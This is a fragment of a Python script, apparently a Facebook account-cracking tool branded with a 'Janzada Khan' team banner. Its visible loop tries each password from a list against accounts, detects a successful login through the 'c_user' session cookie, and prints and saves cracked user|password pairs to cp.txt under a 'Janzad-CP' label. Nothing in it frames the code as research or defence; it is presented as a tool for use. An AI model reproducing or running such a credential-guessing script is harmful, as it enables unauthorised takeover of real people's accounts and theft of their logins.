...
'\x1b[1;91m    __ _____ _____ _____ _____ ____  _____ 
'\x1b[1;91m __|  |  _  |   | |__   |  _  |    \|  _  |
'\x1b[1;91m|  |  |     | | | |   __|     |  |  |     |
'\x1b[1;91m|_____|__|__|_|___|_____|__|__|____/|__|__|
                                            \033
\033[1;97m-----------------------------------------------
...
\033[1;96m➣ \033[1;93mTeam Group  \033[1;92m: \033[1;93mJanzada Khan
\033[1;97m-----------------------------------------------"""
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        pass
                    print('\r%s[Janzad-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('cp.txt' , 'a').write('%s\n' % wrt)
                    break
